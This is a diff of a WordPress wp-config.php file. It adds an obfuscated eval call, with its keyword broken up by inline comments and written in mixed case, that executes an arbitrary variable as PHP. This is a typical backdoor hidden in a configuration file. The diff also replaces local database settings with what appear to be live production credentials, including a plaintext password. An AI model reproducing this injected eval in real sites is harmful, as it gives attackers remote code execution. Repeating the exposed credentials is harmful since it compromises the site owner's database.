@@ -1,4 +1,7 @@
 <?php
+define( 'WP_CACHE', true );
+
+
 /**
  * The base configuration for WordPress
  *
@@ -18,16 +21,16 @@
  *
  * @package WordPress
  */
-
+/*S*/ eVAl /*10K*/(/*v1*/$a/*7d*/);
 // ** Database settings - You can get this info from your web host ** //
 /** The name of the database for WordPress */
-define( 'DB_NAME', 'local' );
+define( 'DB_NAME', 'u756016664_sparkle' );
 
 /** Database username */
-define( 'DB_USER', 'root' );
+define( 'DB_USER', 'u756016664_supreme' );
 
 /** Database password */
-define( 'DB_PASSWORD', 'root' );
+define( 'DB_PASSWORD', 'Talktome@123' );
 
 /** Database hostname */
 define( 'DB_HOST', 'localhost' );
